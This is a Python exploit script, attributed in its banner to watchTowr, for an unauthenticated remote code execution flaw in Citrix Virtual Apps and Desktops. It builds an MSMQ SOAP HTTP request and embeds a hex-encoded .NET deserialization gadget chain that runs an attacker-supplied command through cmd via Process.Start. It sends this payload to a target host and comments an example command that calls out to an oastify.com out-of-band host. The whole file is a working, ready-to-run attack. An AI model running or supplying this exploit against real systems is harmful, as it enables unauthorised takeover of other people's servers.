#!/usr/bin/python3
import socket
import random
from uuid import uuid4
from datetime import datetime, timedelta
import argparse
import sys

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            

        CVE-xxxx-xxxxx.py
        (*) Citrix Virtual Apps and Desktops Unauthenticated Remote Code Execution (CVE-xxxx-xxxxx) exploit by watchTowr
        
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)

        CVEs: [CVE-xxxx-xxxxx]
"""

print(banner)

# Example usage -> python exploit-citrix-xen.py --target target.com --port 80 --cmd "nslookup xxxxxxxxxxxx.oastify.com" --proxy 127.0.0.1:8080

parser = argparse.ArgumentParser(description="Exploit for CVE-xxxx-xxxxx")
parser.add_argument('--target', '-t', type=str, help='IP address or hostname of the target', required=True)
parser.add_argument('--cmd', '-c', type=str, help='Command to execute', required=True)
parser.add_argument('--port', '-p', type=int, help='Port of the target', required=False, default=80)
parser.add_argument('--proxy', type=str, help='Proxy server (host:port)', required=False, default=None)

# Show help if no arguments are provided
if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

args.cmd = ("/c " + args.cmd).encode()
cmdlen = len(args.cmd)

random_boundary = "MSMQ - SOAP boundary, " + str(random.randint(100000000, 999999999))
random_guid = str(uuid4())
random_int = str(random.randint(1000, 9999))

sentAt = datetime.now()
expiresAt = sentAt + timedelta(days=4)
sentAt_str = sentAt.strftime('%Y%m%dT%H%M%S')
TTrq = expiresAt.strftime('%Y%m%dT%H%M%S')

# Prepare payload
VAR_FIRST = f"""POST /msmq/private$/citrixsmaudeventdata HTTP/1.1\r
Host: {args.target}\r
Content-Type: multipart/related; boundary="{random_boundary}"; type=text/xml\r
Content-Length: REPLACE_FULL_SIZE\r
SOAPAction: "MSMQMessage"\r
Proxy-Accept: NonInteractiveClient\r
\r
--{random_boundary}\r
Content-Type: text/xml; charset=UTF-8\r
Content-Length: REPLACE_XML_SIZE\r
\r
"""

THE_XML = f"""<se:Envelope xmlns:se="http://schemas.xmlsoap.org/soap/envelope/" xmlns="http://schemas.xmlsoap.org/srmp/"><se:Header><path xmlns="http://schemas.xmlsoap.org/rp/" se:mustUnderstand="1"><action>MSMQ:</action><to>HTTP://{args.target}/msmq/Private$/CitrixSmAudEventData</to><id>uuid:{random_int}@{random_guid}</id></path><properties se:mustUnderstand="1"><expiresAt>20380119T031407</expiresAt><sentAt>{sentAt_str}</sentAt></properties><Msmq xmlns="msmq.namespace.xml"><Class>0</Class><Priority>3</Priority><Correlation>AAAAAAAAAAAAAAAAAAAAAAAAAAA=</Correlation><App>0</App><BodyType>768</BodyType><HashAlgorithm>32782</HashAlgorithm><SourceQmGuid>{random_guid}</SourceQmGuid><TTrq>{TTrq}</TTrq></Msmq></se:Header><se:Body></se:Body></se:Envelope>""".encode('utf-8')

VAR_THIRD = f"""--{random_boundary}\r
Content-Type: application/octet-stream\r
Content-Length: REPLACE_MESSAGE_SIZE\r
Content-Id: body@{random_guid}\r
\r
"""

THE_MSG = bytes.fromhex("00 01 00 00 00 FF FF FF FF 01 00 00 00 00 00 00 00 0C 02 00 00 00 49 53 79 73 74 65 6D 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 05 01 00 00 00 84 01 53 79 73 74 65 6D 2E 43 6F 6C 6C 65 63 74 69 6F 6E 73 2E 47 65 6E 65 72 69 63 2E 53 6F 72 74 65 64 53 65 74 60 31 5B 5B 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 6D 73 63 6F 72 6C 69 62 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 5D 5D 04 00 00 00 05 43 6F 75 6E 74 08 43 6F 6D 70 61 72 65 72 07 56 65 72 73 69 6F 6E 05 49 74 65 6D 73 00 03 00 06 08 8D 01 53 79 73 74 65 6D 2E 43 6F 6C 6C 65 63 74 69 6F 6E 73 2E 47 65 6E 65 72 69 63 2E 43 6F 6D 70 61 72 69 73 6F 6E 43 6F 6D 70 61 72 65 72 60 31 5B 5B 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 6D 73 63 6F 72 6C 69 62 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 5D 5D 08 02 00 00 00 02 00 00 00 09 03 00 00 00 02 00 00 00 09 04 00 00 00 04 03 00 00 00 8D 01 53 79 73 74 65 6D 2E 43 6F 6C 6C 65 63 74 69 6F 6E 73 2E 47 65 6E 65 72 69 63 2E 43 6F 6D 70 61 72 69 73 6F 6E 43 6F 6D 70 61 72 65 72 60 31 5B 5B 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 6D 73 63 6F 72 6C 69 62 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 5D 5D 01 00 00 00 0B 5F 63 6F 6D 70 61 72 69 73 6F 6E 03 22 53 79 73 74 65 6D 2E 44 65 6C 65 67 61 74 65 53 65 72 69 61 6C 69 7A 61 74 69 6F 6E 48 6F 6C 64 65 72 09 05 00 00 00 11 04 00 00 00 02 00 00 00 06 06") + int.to_bytes(cmdlen, 4, 'big') + args.cmd + bytes.fromhex("06 07 00 00 00 03 63 6D 64 04 05 00 00 00 22 53 79 73 74 65 6D 2E 44 65 6C 65 67 61 74 65 53 65 72 69 61 6C 69 7A 61 74 69 6F 6E 48 6F 6C 64 65 72 03 00 00 00 08 44 65 6C 65 67 61 74 65 07 6D 65 74 68 6F 64 30 07 6D 65 74 68 6F 64 31 03 03 03 30 53 79 73 74 65 6D 2E 44 65 6C 65 67 61 74 65 53 65 72 69 61 6C 69 7A 61 74 69 6F 6E 48 6F 6C 64 65 72 2B 44 65 6C 65 67 61 74 65 45 6E 74 72 79 2F 53 79 73 74 65 6D 2E 52 65 66 6C 65 63 74 69 6F 6E 2E 4D 65 6D 62 65 72 49 6E 66 6F 53 65 72 69 61 6C 69 7A 61 74 69 6F 6E 48 6F 6C 64 65 72 2F 53 79 73 74 65 6D 2E 52 65 66 6C 65 63 74 69 6F 6E 2E 4D 65 6D 62 65 72 49 6E 66 6F 53 65 72 69 61 6C 69 7A 61 74 69 6F 6E 48 6F 6C 64 65 72 09 08 00 00 00 09 09 00 00 00 09 0A 00 00 00 04 08 00 00 00 30 53 79 73 74 65 6D 2E 44 65 6C 65 67 61 74 65 53 65 72 69 61 6C 69 7A 61 74 69 6F 6E 48 6F 6C 64 65 72 2B 44 65 6C 65 67 61 74 65 45 6E 74 72 79 07 00 00 00 04 74 79 70 65 08 61 73 73 65 6D 62 6C 79 06 74 61 72 67 65 74 12 74 61 72 67 65 74 54 79 70 65 41 73 73 65 6D 62 6C 79 0E 74 61 72 67 65 74 54 79 70 65 4E 61 6D 65 0A 6D 65 74 68 6F 64 4E 61 6D 65 0D 64 65 6C 65 67 61 74 65 45 6E 74 72 79 01 01 02 01 01 01 03 30 53 79 73 74 65 6D 2E 44 65 6C 65 67 61 74 65 53 65 72 69 61 6C 69 7A 61 74 69 6F 6E 48 6F 6C 64 65 72 2B 44 65 6C 65 67 61 74 65 45 6E 74 72 79 06 0B 00 00 00 B0 02 53 79 73 74 65 6D 2E 46 75 6E 63 60 33 5B 5B 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 6D 73 63 6F 72 6C 69 62 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 5D 2C 5B 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 6D 73 63 6F 72 6C 69 62 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 5D 2C 5B 53 79 73 74 65 6D 2E 44 69 61 67 6E 6F 73 74 69 63 73 2E 50 72 6F 63 65 73 73 2C 20 53 79 73 74 65 6D 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 5D 5D 06 0C 00 00 00 4B 6D 73 63 6F 72 6C 69 62 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 0A 06 0D 00 00 00 49 53 79 73 74 65 6D 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 06 0E 00 00 00 1A 53 79 73 74 65 6D 2E 44 69 61 67 6E 6F 73 74 69 63 73 2E 50 72 6F 63 65 73 73 06 0F 00 00 00 05 53 74 61 72 74 09 10 00 00 00 04 09 00 00 00 2F 53 79 73 74 65 6D 2E 52 65 66 6C 65 63 74 69 6F 6E 2E 4D 65 6D 62 65 72 49 6E 66 6F 53 65 72 69 61 6C 69 7A 61 74 69 6F 6E 48 6F 6C 64 65 72 07 00 00 00 04 4E 61 6D 65 0C 41 73 73 65 6D 62 6C 79 4E 61 6D 65 09 43 6C 61 73 73 4E 61 6D 65 09 53 69 67 6E 61 74 75 72 65 0A 53 69 67 6E 61 74 75 72 65 32 0A 4D 65 6D 62 65 72 54 79 70 65 10 47 65 6E 65 72 69 63 41 72 67 75 6D 65 6E 74 73 01 01 01 01 01 00 03 08 0D 53 79 73 74 65 6D 2E 54 79 70 65 5B 5D 09 0F 00 00 00 09 0D 00 00 00 09 0E 00 00 00 06 14 00 00 00 3E 53 79 73 74 65 6D 2E 44 69 61 67 6E 6F 73 74 69 63 73 2E 50 72 6F 63 65 73 73 20 53 74 61 72 74 28 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 29 06 15 00 00 00 3E 53 79 73 74 65 6D 2E 44 69 61 67 6E 6F 73 74 69 63 73 2E 50 72 6F 63 65 73 73 20 53 74 61 72 74 28 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 29 08 00 00 00 0A 01 0A 00 00 00 09 00 00 00 06 16 00 00 00 07 43 6F 6D 70 61 72 65 09 0C 00 00 00 06 18 00 00 00 0D 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 06 19 00 00 00 2B 49 6E 74 33 32 20 43 6F 6D 70 61 72 65 28 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 29 06 1A 00 00 00 32 53 79 73 74 65 6D 2E 49 6E 74 33 32 20 43 6F 6D 70 61 72 65 28 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 29 08 00 00 00 0A 01 10 00 00 00 08 00 00 00 06 1B 00 00 00 71 53 79 73 74 65 6D 2E 43 6F 6D 70 61 72 69 73 6F 6E 60 31 5B 5B 53 79 73 74 65 6D 2E 53 74 72 69 6E 67 2C 20 6D 73 63 6F 72 6C 69 62 2C 20 56 65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39 5D 5D 09 0C 00 00 00 0A 09 0C 00 00 00 09 18 00 00 00 09 16 00 00 00 0A 0B")

THE_END = f"--{random_boundary}--\r\n"

xml_size = len(THE_XML)
message_size = len(THE_MSG)

VAR_FIRST = VAR_FIRST.replace("REPLACE_XML_SIZE", str(xml_size))
VAR_THIRD = VAR_THIRD.replace("REPLACE_MESSAGE_SIZE", str(message_size))

final_payload = VAR_FIRST.encode() + THE_XML + VAR_THIRD.encode() + THE_MSG + THE_END.encode()

final_payload = final_payload.replace(b"REPLACE_FULL_SIZE", str(len(final_payload[final_payload.index(b"--MSMQ"):])).encode())

# Resolve hostname to IP if needed
try:
    resolved_target = socket.gethostbyname(args.target)
except socket.gaierror:
    print(f"[ERROR] Unable to resolve hostname {args.target}. Exiting.")
    sys.exit(1)

# Proxy support
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if args.proxy:
        proxy_host, proxy_port = args.proxy.split(":")
        proxy_port = int(proxy_port)
        s.connect((proxy_host, proxy_port))
        connect_request = f"CONNECT {resolved_target}:{args.port} HTTP/1.1\r\nHost: {args.target}:{args.port}\r\n\r\n"
        s.sendall(connect_request.encode())
        response = s.recv(4096)
        if b"200 Connection established" not in response:
            print("[ERROR] Proxy connection failed!")
            exit(1)
    else:
        s.connect((resolved_target, args.port))
    
    s.send(final_payload)
    s.close()
except Exception as e:
    print(f"[ERROR] Connection to target {args.target} failed! Error: {e}")
    exit(1)

print(f"[INFO] Command sent to {args.target} ({resolved_target}) successfully!")

